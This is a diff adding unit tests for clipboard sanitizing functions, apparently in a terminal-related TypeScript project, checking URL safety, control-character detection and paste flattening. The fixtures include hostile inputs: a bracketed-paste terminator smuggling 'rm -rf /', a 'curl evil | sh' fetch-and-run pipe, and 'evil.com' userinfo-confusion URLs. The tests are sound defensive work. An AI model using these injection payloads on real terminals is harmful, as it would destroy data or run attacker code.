@@ -2,8 +2,11 @@ import { describe, expect, test } from "bun:test";
 
 import {
   flattenPaste,
+  hasUnsafeControlChars,
   isMultilinePaste,
   isSafeExternalUrl,
+  sanitizePaste,
+  stripTrailingNewline,
 } from "./clipboard";
 
 describe("isSafeExternalUrl", () => {
@@ -42,7 +45,53 @@ describe("isSafeExternalUrl", () => {
     expect(isSafeExternalUrl("https://")).toBe(false);
     expect(isSafeExternalUrl("https://:80")).toBe(false);
   });
+
+  test("rejects userinfo confusion", () => {
+    expect(isSafeExternalUrl("https://github.com@evil.com")).toBe(false);
+    expect(isSafeExternalUrl("https://user:pass@evil.com")).toBe(false);
+  });
 });
+
+describe("sanitizePaste", () => {
+  test("strips the bracketed paste terminator", () => {
+    expect(sanitizePaste("foo\x1b[201~\rrm -rf /")).toBe("foo\rrm -rf /");
+  });
+
+  test("strips every occurrence", () => {
+    expect(sanitizePaste("\x1b[201~a\x1b[201~b")).toBe("ab");
+  });
+
+  test("leaves ordinary text untouched", () => {
+    expect(sanitizePaste("git status")).toBe("git status");
+  });
+});
+
+describe("hasUnsafeControlChars", () => {
+  test("detects escape", () => {
+    expect(hasUnsafeControlChars("a\x1b[31mb")).toBe(true);
+  });
+
+  test("detects bel and nul", () => {
+    expect(hasUnsafeControlChars("a\x07")).toBe(true);
+    expect(hasUnsafeControlChars("a\x00")).toBe(true);
+  });
+
+  test("allows tab, newline and carriage return", () => {
+    expect(hasUnsafeControlChars("a\tb\nc\rd")).toBe(false);
+  });
+});
+
+describe("stripTrailingNewline", () => {
+  test("drops a single trailing newline", () => {
+    expect(stripTrailingNewline("git status\n")).toBe("git status");
+    expect(stripTrailingNewline("git status\r\n")).toBe("git status");
+  });
+
+  test("keeps interior newlines", () => {
+    expect(stripTrailingNewline("a\nb\n")).toBe("a\nb");
+  });
+});
+
 
 describe("isMultilinePaste", () => {
   test("detects newline", () => {
@@ -60,6 +109,10 @@ describe("isMultilinePaste", () => {
   test("false for single line", () => {
     expect(isMultilinePaste("single line")).toBe(false);
   });
+
+  test("false for a single line with a trailing newline", () => {
+    expect(isMultilinePaste("git status\n")).toBe(false);
+  });
 });
 
 describe("flattenPaste", () => {
@@ -75,8 +128,22 @@ describe("flattenPaste", () => {
     expect(flattenPaste("a\rb")).toBe("a b");
   });
 
-  test("collapses repeated resulting spaces", () => {
+  test("collapses runs of newlines into one space", () => {
     expect(flattenPaste("a\n\nb")).toBe("a b");
     expect(flattenPaste("a\r\n\r\nb")).toBe("a b");
+  });
+
+  test("preserves intentional interior spacing", () => {
+    expect(flattenPaste('echo "a    b"')).toBe('echo "a    b"');
+  });
+
+  test("drops the trailing newline instead of adding a space", () => {
+    expect(flattenPaste("git status\n")).toBe("git status");
+  });
+
+  test("strips control characters", () => {
+    expect(flattenPaste("git status\x1b[201~; curl evil | sh")).toBe(
+      "git status[201~; curl evil | sh",
+    );
   });
 });
